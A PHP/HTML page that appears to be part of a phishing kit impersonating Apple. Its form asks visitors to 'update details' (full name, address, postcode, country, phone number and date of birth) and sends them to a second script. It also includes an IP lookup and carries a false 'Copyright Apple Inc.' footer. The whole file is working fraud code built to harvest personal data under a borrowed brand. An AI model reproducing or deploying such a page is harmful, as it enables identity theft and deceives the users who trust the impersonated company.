<?php
session_start();
include "../functions/get_ip.php";
include "../functions/lang.php";
?>
<!DOCTYPE HTML>
<html lang="en">
<head>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
<title><?php echo $manage;?></title>
<!-- Meta tag Keywords -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Online Login Form Responsive Widget,Login form widgets, Sign up Web forms , Login signup Responsive web form,Flat Pricing table,Flat Drop downs,Registration Forms,News letter Forms,Elements" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false);
function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- Meta tag Keywords -->
<!-- css files -->
<link rel="stylesheet" href="css/style.css" type="text/css" media="all" /> <!-- Style-CSS --> 
<link rel="stylesheet" href="css/font-awesome.css"> <!-- Font-Awesome-Icons-CSS -->
<!-- //css files -->
<!-- online-fonts -->
<link href="//fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&amp;subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese" rel="stylesheet">
<link href="//fonts.googleapis.com/css?family=Dosis:200,300,400,500,600,700,800&amp;subset=latin-ext" rel="stylesheet">
<!-- //online-fonts -->
</head>
<body>
<!-- main -->

	
<div class="bodyy">
		  <div align="center"><img src="images/1x.png" align="left"><img src="images/2x.png" align="absmiddle"><img src="images/3x.png" align="right"></div>
	</div>
	
	<!--//header-->
	<div class="main-content-agile">
		<div class="sub-main-w3">	
			<div class="user"></div>
		  <form action="2.php" method="post">
				<div class="pom-agile">
				  <div style="background-color:#F2F2F2; border-top-right-radius: 2em; border-top-left-radius: 2em;" align="center"> 
				    <h1>&nbsp;</h1>
				    <h1><?php echo $updatedetails;?> </h1>
				    <p>&nbsp;</p>
				  </div>
				</div>
			<div class="pom-agile">
  <div style="background-color:#F2F2F2" align="center">
<input name="firstname1" type="text" placeholder="<?php echo $fname;?>" id="firstname1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="lastname1" type="text" placeholder="<?php echo $lname;?>" id="lastname1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="address1" type="text" placeholder="<?php echo $addr;?>" id="address1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="city1" type="text" placeholder="<?php echo $cit;?>" id="city1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="postcode1" type="text" placeholder="<?php echo $pcode;?>" id="postcode1" class="user" required />
</div>
</div>
<div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="country1" type="text" placeholder="Country" value="<?php echo $_SESSION['_LOOKUP_COUNTRY_'];?>" id="country1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="phonenumber1" type="text" placeholder="<?php echo $pnumber;?>" id="phonenumber1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
  <p>
    <input name="dob1" type="text" maxlength="10" placeholder="<?php echo $dobb;?>" id="dob1" onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d\/\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')" class="user" required />
  </p>
  <p>&nbsp;</p>
</div>
<div class="pom-agile" style="background-color:#F2F2F2; border-bottom-right-radius: 2em; border-bottom-left-radius: 2em;" align="center">
						<p align="center">
						  <input type="submit" value="<?php echo $continuee;?>">
					  </p>
		  <p align="center">&nbsp;</p>
					</div>
</div>
		  </form>
		</div>
	</div>
	<!--//main-->
	<!--footer--><!--//footer-->
</div>

  <div class="downn">
    <h1 class="downn">Copyright © 2017 Apple Inc. All rights reserved.</h1>
  </div>

</body>
</html>